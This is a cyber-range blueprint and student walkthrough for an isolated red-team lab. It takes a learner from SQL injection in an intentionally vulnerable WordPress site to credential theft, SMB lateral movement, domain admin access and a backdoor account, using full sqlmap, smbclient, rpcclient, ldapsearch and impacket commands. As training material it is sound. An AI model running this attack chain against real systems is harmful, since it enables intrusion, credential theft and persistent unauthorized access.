# CYROID Red Team Training Lab Blueprint
seed_id: red-team-training-lab
name: Red Team Training Lab
description: |
  Comprehensive red team training environment featuring:
  - Kali Attack Box with pre-installed tools (Metasploit, Impacket, CrackMapExec, etc.)
  - WordPress target with SQL injection vulnerabilities
  - Samba Domain Controller
  - Internal file server with sensitive data
  - Victim workstation for BeEF exploitation
  - C2 redirectors for infrastructure training

  Attack paths: SQLi -> Credential theft -> Lateral movement -> Domain compromise

base_subnet_prefix: "172.16"

networks:
  - name: internet
    subnet: "172.16.0.0/24"
    gateway: "172.16.0.1"
    is_isolated: false

  - name: dmz
    subnet: "172.16.1.0/24"
    gateway: "172.16.1.1"
    is_isolated: true

  - name: internal
    subnet: "172.16.2.0/24"
    gateway: "172.16.2.1"
    is_isolated: true

vms:
  # Attack box - Custom Kali with pre-installed tools (Metasploit, Impacket, etc.)
  - hostname: kali
    base_image_tag: "127.0.0.1:5000/cyroid/kali-attack:latest"
    network_name: internet
    ip_address: "172.16.0.10"
    cpu: 4
    ram_mb: 4096
    disk_gb: 60
    position_x: 100
    position_y: 200

  # C2 Redirectors - Lightweight Alpine containers
  - hostname: redir1
    base_image_tag: "alpine:latest"
    network_name: internet
    ip_address: "172.16.0.20"
    cpu: 1
    ram_mb: 512
    disk_gb: 10
    position_x: 100
    position_y: 100

  - hostname: redir2
    base_image_tag: "alpine:latest"
    network_name: internet
    ip_address: "172.16.0.21"
    cpu: 1
    ram_mb: 512
    disk_gb: 10
    position_x: 100
    position_y: 300

  # DMZ - Vulnerable WordPress with SQLi
  - hostname: webserver
    base_image_tag: "127.0.0.1:5000/cyroid/redteam-lab-wordpress:latest"
    network_name: dmz
    ip_address: "172.16.1.10"
    cpu: 2
    ram_mb: 2048
    disk_gb: 20
    position_x: 400
    position_y: 200

  # Internal network - Samba File Server with sensitive data
  # NOTE: fileserver at .10 so credential reuse attack works per walkthrough
  - hostname: fileserver
    base_image_tag: "127.0.0.1:5000/cyroid/redteam-lab-fileserver:latest"
    network_name: internal
    ip_address: "172.16.2.10"
    cpu: 1
    ram_mb: 1024
    disk_gb: 10
    position_x: 700
    position_y: 100

  # Internal network - Victim Workstation (simulated browsing)
  - hostname: ws01
    base_image_tag: "127.0.0.1:5000/cyroid/redteam-lab-workstation:latest"
    network_name: internal
    ip_address: "172.16.2.11"
    cpu: 1
    ram_mb: 1024
    disk_gb: 10
    position_x: 700
    position_y: 200

  # Internal network - Samba Domain Controller
  # NOTE: DC at .12 to match walkthrough network diagram
  - hostname: dc01
    base_image_tag: "127.0.0.1:5000/cyroid/samba-dc:latest"
    network_name: internal
    ip_address: "172.16.2.12"
    cpu: 2
    ram_mb: 2048
    disk_gb: 20
    position_x: 700
    position_y: 300

router:
  enabled: true
  dhcp_enabled: false

# Walkthrough/Student Guide (Content Library format)
# This matches the walkthrough_data JSON structure used in the Content Library
walkthrough:
  title: "Red Team Training Lab"
  description: "A comprehensive guide to penetration testing fundamentals covering reconnaissance, SQL injection, lateral movement, and domain compromise."
  content_type: "student_guide"
  version: "1.0"
  tags:
    - red-team
    - penetration-testing
    - training
  phases:
    - id: phase1
      name: "Reconnaissance"
      steps:
        - id: step1_1
          vm: kali
          title: "Understanding Your Position"
          content: |
            ## Your Mission

            You are a penetration tester hired to assess **Acme Widgets'** security. Your goal: gain Domain Admin access starting from outside the network.

            ### Network Architecture

            ```
            INTERNET (172.16.0.0/24)
            ├── kali (172.16.0.10)        ← You are here
            └── wordpress (172.16.0.100)  ← Your initial target

            DMZ (172.16.1.0/24)
            └── wordpress (172.16.1.10)   ← Same server, internal IP

            INTERNAL (172.16.2.0/24)
            ├── fileserver (172.16.2.10)  ← SMB File Server
            ├── ws01 (172.16.2.11)        ← Employee Workstation
            └── dc01 (172.16.2.12)        ← Domain Controller
            ```

            ### First Steps

            Open a terminal and check your IP address:

            ```bash
            ip addr show eth0
            ```

            > You should see `172.16.0.10` - you're on the "internet" network.

        - id: step1_2
          vm: kali
          title: "Network Discovery"
          content: |
            ## Discover Live Hosts

            Let's find what hosts are reachable from our position.

            ```bash
            # Ping sweep - find live hosts
            nmap -sn 172.16.0.0/24
            ```

            **What `-sn` does:** Host discovery only, no port scan. Fast and stealthy.

            ### Expected Results

            You should find:
            - `172.16.0.1` - Gateway
            - `172.16.0.10` - Your Kali box
            - `172.16.0.100` - **WordPress server** (your target!)

        - id: step1_3
          vm: kali
          title: "Service Enumeration"
          content: |
            ## Enumerate the Target

            Now scan the WordPress server for open ports and services:

            ```bash
            nmap -sV -sC 172.16.0.100
            ```

            **Flags explained:**
            - `-sV` - Detect service versions
            - `-sC` - Run default NSE scripts

            ### Expected Results

            | Port | Service | Notes |
            |------|---------|-------|
            | 22 | SSH | OpenSSH server |
            | 80 | HTTP | Apache web server |

            > **Next:** Let's explore that web application!

    - id: phase2
      name: "SQL Injection"
      steps:
        - id: step2_1
          vm: kali
          title: "Explore the Web App"
          content: |
            ## Web Application Reconnaissance

            Open Firefox and browse to the target:

            ```
            http://172.16.0.100
            ```

            Or use curl:
            ```bash
            curl -s http://172.16.0.100 | head -50
            ```

            ### What to Look For

            - Technology stack (WordPress, custom app?)
            - Login forms and search boxes
            - Links to other pages

            > **Hint:** Look for an **Employee Directory** page!

        - id: step2_2
          vm: kali
          title: "Find the Vulnerable Page"
          content: |
            ## Directory Discovery

            Let's find hidden pages using gobuster:

            ```bash
            gobuster dir -u http://172.16.0.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
            ```

            ### Expected Output

            You should see several results including:

            ```
            /wp-admin             (Status: 301)
            /wp-content           (Status: 301)
            /wp-includes          (Status: 301)
            /employees            (Status: 301)  ← This looks interesting!
            ```

            ### Investigate the Finding

            Navigate to the discovered `/employees/` page:

            ```
            http://172.16.0.100/employees/
            ```

            ### What Do You See?

            - A table of employees with names, departments, and contact info
            - A **search box** - user input is always interesting for attackers!
            - **Clickable employee names** - click on "John Smith" and notice the URL changes

            When you click an employee, the URL becomes:
            ```
            http://172.16.0.100/employees/?employee_id=1
            ```

            This `employee_id` parameter is user-controllable input - a potential injection point!

        - id: step_sqli_intro
          title: "Understanding SQL Injection"
          content: |
            ## What is SQL Injection?

            SQL Injection (SQLi) occurs when user input is inserted directly into a SQL query without proper sanitization. This allows attackers to manipulate the query's logic and access or modify data they shouldn't be able to reach.

            ### How Does It Work?

            Imagine a web application that looks up employee details with code like this:

            ```php
            // VULNERABLE CODE - Never do this!
            $query = "SELECT * FROM employees WHERE id = " . $_GET['employee_id'];
            ```

            When you visit `?employee_id=1`, the query becomes:
            ```sql
            SELECT * FROM employees WHERE id = 1
            ```

            But what if you visit `?employee_id=1 OR 1=1`? The query becomes:
            ```sql
            SELECT * FROM employees WHERE id = 1 OR 1=1
            ```

            Since `1=1` is always true, this returns ALL employees instead of just one!

            ### Why Is This Dangerous?

            With SQL injection, attackers can:
            - **Read sensitive data** - Extract usernames, passwords, credit cards
            - **Bypass authentication** - Log in without valid credentials
            - **Modify data** - Change prices, delete records, add admin accounts
            - **Execute system commands** - On some databases, run OS commands

            ### Boolean-Based Testing

            The simplest way to test for SQLi is with boolean conditions:
            - `AND 1=1` - Always TRUE, query should work normally
            - `AND 1=2` - Always FALSE, query should return nothing

            If the page behaves differently between these two, the input is being executed as SQL!

        - id: step2_3
          vm: kali
          title: "Test for SQL Injection"
          content: |
            ## Testing for SQL Injection

            The page has two potential injection points:
            1. The `search` parameter (search box)
            2. The `employee_id` parameter (employee detail links)

            Click on an employee name to see their details. Notice the URL changes to include `employee_id=1`.

            ### Testing the employee_id Parameter

            This numeric field is easier to exploit. We'll extract the employee's notes field to see the difference:

            ```bash
            # Normal request - should show employee notes
            curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
            ```

            **Expected output:** `IT admin, has server access`

            Now test with boolean SQL injection:

            ```bash
            # Boolean true (1=1) - should still show notes (spaces URL-encoded as %20)
            curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
            ```

            **Expected output:** `IT admin, has server access` (same as before)

            ```bash
            # Boolean false (1=2) - should return NOTHING
            curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=2" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
            ```

            **Expected output:** (empty - no output!)

            > **Different responses confirm SQL injection!** The injected SQL is being executed by the database.

        - id: step2_4
          vm: kali
          title: "Extract Data with SQLMap"
          content: |
            ## Automated Exploitation

            SQLMap automates SQL injection attacks. Let's use it!

            ### Step 1: Confirm the Vulnerability

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --batch
            ```

            `-p employee_id` tells SQLMap which parameter to test.

            ### Step 2: List Databases

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --dbs --batch
            ```

            ### Step 3: List Tables

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress --tables --batch
            ```

            > Look for: `wp_acme_employees`

        - id: step2_5
          vm: kali
          title: "Dump the Credentials!"
          content: |
            ## Extract Employee Data

            Now dump the employee table:

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" \
              -p employee_id -D wordpress -T wp_acme_employees --dump --batch
            ```

            ### CRITICAL FINDING

            The output reveals **VPN credentials in plaintext**:

            | Employee | Username | Password |
            |----------|----------|----------|
            | John Smith | jsmith | Summer2024 |
            | Mary Williams | mwilliams | Welcome123 |
            | **Backup Service** | **svc_backup** | **Backup2024** |

            > **The service account is your ticket to the internal network!**

    - id: phase3
      name: "Lateral Movement"
      steps:
        - id: step3_1
          vm: kali
          title: "Test Credential Reuse"
          content: |
            ## The Credential Reuse Attack

            Employees and services often reuse passwords across systems. Let's test if `svc_backup` credentials from the WordPress database also work on the internal file server.

            ### Understanding Credential Reuse

            This is one of the most common attack vectors:
            1. Attacker compromises one system (WordPress database)
            2. Extracts credentials (svc_backup / Backup2024)
            3. Tests those credentials on other systems
            4. Gains access to additional resources

            ### Method 1: Using Impacket (Recommended)

            Impacket is a powerful Python toolkit commonly used in penetration testing:

            ```bash
            impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
            ```

            Once connected, list available shares:
            ```
            # shares
            ```

            ### Method 2: Using Standard smbclient

            Alternatively, use the standard Linux SMB client:

            ```bash
            # List shares
            smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'
            ```

            ### Expected Shares

            | Share | Description |
            |-------|-------------|
            | public | Open to everyone |
            | **sensitive** | Restricted - but svc_backup has access! |
            | accounting | Financial documents |
            | IPC$ | Inter-process communication |

            > **The credentials work!** This confirms password reuse between systems.

        - id: step3_2
          vm: kali
          title: "Access the Sensitive Share"
          content: |
            ## Exploring the File Server

            Now connect to the sensitive share and look for interesting files:

            ```bash
            smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'
            ```

            Once connected, list the contents:
            ```
            smb: \> ls
            ```

            ### What Do You See?

            Look for files like:
            - `passwords.txt` - Password lists
            - `*.kdbx` - KeePass databases
            - `*.xlsx` - Excel files with data
            - `backup_*` - Backup scripts with hardcoded creds

            ### Download Interesting Files

            ```
            smb: \> get passwords.txt
            ```

            Exit the SMB session:
            ```
            smb: \> exit
            ```

            ### Read the File

            ```bash
            cat passwords.txt
            ```

            > **What did you find?** Move to the next step to see the critical discovery!

        - id: step3_3
          vm: kali
          title: "The Domain Admin Password"
          content: |
            ## Critical Discovery!

            The `passwords.txt` file reveals emergency credentials:

            ```
            === ACME INTERNAL PASSWORD LIST ===
            DO NOT SHARE OUTSIDE IT DEPARTMENT

            Server Room Door: 4521
            WiFi Password: AcmeGuest2024
            VPN PSK: AcmeVPN2024
            Backup Encryption: BackupKey2024!

            Domain Admin (emergency): Adm1n2024
            ```

            ### What You've Found

            | Account | Password | Access Level |
            |---------|----------|--------------|
            | Administrator | Adm1n2024 | **DOMAIN ADMIN** |

            ### Why This Matters

            - **Plaintext passwords** stored on a file share (terrible practice!)
            - **Domain Admin credentials** give you complete control of the network
            - This is a common finding in real penetration tests

            > **You now have the keys to the kingdom!**

            Next, we'll verify these credentials work on the Domain Controller.

    - id: phase4
      name: "Domain Compromise"
      steps:
        - id: step4_1
          vm: kali
          title: "Verify Domain Admin Credentials"
          content: |
            ## Testing the Domain Admin Password

            You found `Adm1n2024` in the passwords.txt file. Let's verify it actually works!

            ### Test Authentication via SMB

            ```bash
            smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'
            ```

            **Expected output:** A list of shares including `sysvol` and `netlogon` - these are only visible to authenticated domain users.

            ### Test RPC Authentication

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusername'
            ```

            **Expected output:**
            ```
            Account Name: Administrator, Authority Name: ACMEWIDGETS
            ```

            > **The credentials work!** You now have Domain Administrator access.

        - id: step4_2
          vm: kali
          title: "Enumerate the Domain"
          content: |
            ## Mapping the Domain

            With Domain Admin credentials, let's discover everything about this network.

            ### List All Domain Users

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'
            ```

            **Expected output:**
            ```
            user:[Administrator] rid:[0x1f4]
            user:[Guest] rid:[0x1f5]
            user:[krbtgt] rid:[0x1f6]
            user:[jsmith] rid:[0x3e8]
            user:[mwilliams] rid:[0x3e9]
            user:[svc_backup] rid:[0x3ea]
            ```

            ### Get User Details

            ```bash
            # Query the svc_backup account (RID 0x3ea = 1002)
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser 0x3ea'
            ```

            Notice the **description field** - it reveals the account's purpose!

            ### Enumerate Domain Groups

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'
            ```

            ### Who's in Domain Admins?

            ```bash
            # RID 512 = Domain Admins group
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 512'
            ```

            > **These enumeration skills transfer directly to Windows AD.** Master them here, use them everywhere.

        - id: step4_3
          vm: kali
          title: "Check Password Policy"
          content: |
            ## Password Policy Enumeration

            Understanding the domain's password policy helps plan attacks like password spraying.

            ### Get Domain Password Policy

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getdompwinfo'
            ```

            **What to look for:**
            - **Minimum password length** - Short = weak passwords likely
            - **Password complexity** - Disabled = simple passwords
            - **Lockout threshold** - How many guesses before lockout?

            ### Get Account Lockout Policy

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusrdompwinfo 500'
            ```

            > **Why this matters:** If there's no lockout (or high threshold), you could spray passwords against all users. In this lab, you already have Domain Admin, but in real engagements this is valuable recon.

        - id: step4_4
          vm: kali
          title: "Prove Domain Control"
          content: |
            ## Demonstrate Full Domain Access

            The ultimate proof of domain compromise is accessing protected resources.

            ### Access SYSVOL (Domain Admin Required)

            SYSVOL contains Group Policy objects. Only Domain Admins can write here:

            ```bash
            smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
            ```

            ### Access NETLOGON Share

            ```bash
            smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'
            ```

            ### Cross-Domain Access

            Domain Admin credentials work on ALL domain-joined systems:

            ```bash
            # Access sensitive share on file server using Domain Admin
            smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
            ```

            > **Notice:** You accessed the file server with Domain Admin credentials, not svc_backup. This demonstrates domain-wide access.

        - id: step4_5
          vm: kali
          title: "Create a Backdoor Account"
          content: |
            ## Persistence: Adding a Backdoor

            A common post-exploitation technique is creating a hidden admin account for persistent access.

            ### Create a New Domain User

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'createdomuser support'
            ```

            ### Set the Password

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'setuserinfo2 support 24 P@ssw0rd123!'
            ```

            ### Verify the Account Exists

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers' | grep support
            ```

            ### Test the New Account

            ```bash
            smbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'
            ```

            > **In real environments:** Attackers create accounts like "support", "svc_scanner", or "admin2" that blend in. Blue teams should monitor for unexpected account creation.

            ### Why This Matters

            With Domain Admin access, attackers can:
            - ✅ **Create new admin accounts** for persistence
            - ✅ **Read/write any file** on domain systems
            - ✅ **Access all user data** across the organization
            - ✅ **Modify Group Policy** (in Windows AD)

            > **You now have complete domain control with a persistent backdoor!**

    - id: phase5
      name: "Post-Exploitation"
      steps:
        - id: step5_1
          vm: kali
          title: "LDAP Deep Dive"
          content: |
            ## LDAP Enumeration

            LDAP provides more detailed information than RPC. Let's extract everything.

            ### List All Users with Details

            ```bash
            ldapsearch -x -H ldap://172.16.2.12 \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'cn=Users,DC=acmewidgets,DC=local' \
              '(objectClass=user)' sAMAccountName description memberOf
            ```

            ### Find Service Accounts

            Service accounts often have elevated privileges and weak passwords:

            ```bash
            ldapsearch -x -H ldap://172.16.2.12 \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'DC=acmewidgets,DC=local' \
              '(description=*service*)' sAMAccountName description
            ```

            ### Export Domain Admin Members

            ```bash
            ldapsearch -x -H ldap://172.16.2.12 \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'DC=acmewidgets,DC=local' \
              '(cn=Domain Admins)' member
            ```

            > **Pro tip:** In real engagements, export this data to a file and analyze offline to find attack paths and high-value targets.

        - id: step5_2
          vm: kali
          title: "Windows AD: What's Different"
          content: |
            ## Windows AD Attacks (Educational Reference)

            This lab uses Samba AD. In a **Windows AD** environment, you'd have additional attack options.

            ### DCSync Attack (Windows Only)

            DCSync replicates password hashes directly from a Domain Controller:

            ```bash
            # This would work on Windows AD, NOT in this lab
            impacket-secretsdump 'ACMEWIDGETS/Administrator:Adm1n2024@DC_IP'
            ```

            **Why it doesn't work here:** DCSync uses Windows DRSUAPI (replication protocol). Samba doesn't implement this.

            ### Remote Code Execution (Windows Only)

            ```bash
            # PSExec - creates a service on target
            impacket-psexec 'Administrator:Adm1n2024@TARGET_IP'

            # WMIExec - uses Windows Management Instrumentation
            impacket-wmiexec 'Administrator:Adm1n2024@TARGET_IP'
            ```

            **Why these don't work here:** They require Windows services (SCM, WMI) that don't exist on Linux/Samba.

            ### What DOES Transfer

            The skills you practiced work everywhere:
            - ✅ SMB enumeration and authentication
            - ✅ RPC-based user/group enumeration
            - ✅ LDAP queries and data extraction
            - ✅ Password policy analysis
            - ✅ Account creation for persistence

            > **Real-world insight:** Many networks mix Windows and Linux. Knowing both attack surfaces makes you more effective.

        - id: step5_3
          vm: kali
          title: "Mission Complete!"
          content: |
            ## Attack Chain Summary

            Congratulations! Here's your complete attack path:

            ```
            1. RECONNAISSANCE
               └── nmap discovered WordPress at 172.16.0.100
                   └── Ports 22 (SSH), 80 (HTTP) open

            2. SQL INJECTION
               └── Employee Directory (/employees/)
                   └── SQLi in employee_id parameter
                       └── Extracted credentials:
                           - svc_backup / Backup2024

            3. LATERAL MOVEMENT
               └── Credential reuse on file server (172.16.2.10)
                   └── svc_backup → sensitive share
                       └── Found passwords.txt
                           └── Domain Admin: Adm1n2024

            4. DOMAIN COMPROMISE
               └── Authenticated to DC01 (172.16.2.12)
                   └── Enumerated all users and groups
                       └── Checked password policies
                           └── Created backdoor "support" account

            5. PERSISTENCE
               └── Backdoor account: support / P@ssw0rd123!
                   └── Full domain access established
            ```

            ## Defensive Lessons

            | Vulnerability | Fix |
            |--------------|-----|
            | SQL Injection | Parameterized queries, input validation |
            | Plaintext passwords in files | Use a secrets manager (Vault, AWS Secrets) |
            | Password reuse | Unique passwords + MFA everywhere |
            | Sensitive files on shares | Proper ACLs, audit access |
            | No account creation alerts | Monitor for new accounts (SIEM) |
            | Service accounts with file access | Least privilege, no interactive logon |

            ## Next Steps for Learning

            1. **Try attacking differently** - Can you get Domain Admin without using passwords.txt?
            2. **Blue team it** - How would you detect each attack step?
            3. **Expand your skills** - Try Kerberoasting, AS-REP roasting in Windows labs

            > **Remember:** Only use these techniques with explicit written authorization!

# Training scenario events (MSEL)
events:
  - sequence: 1
    delay_minutes: 0
    title: "Phase 1: Reconnaissance"
    description: "Use Kali tools to scan and enumerate the DMZ webserver"

  - sequence: 2
    delay_minutes: 15
    title: "Phase 2: Initial Access"
    description: "Exploit SQL injection in WordPress to extract credentials"

  - sequence: 3
    delay_minutes: 30
    title: "Phase 3: Credential Harvesting"
    description: "Use extracted credentials to access internal network"

  - sequence: 4
    delay_minutes: 45
    title: "Phase 4: Lateral Movement"
    description: "Move from webserver to internal hosts using Impacket"

  - sequence: 5
    delay_minutes: 60
    title: "Phase 5: Domain Compromise"
    description: "Extract domain admin credentials and compromise DC"
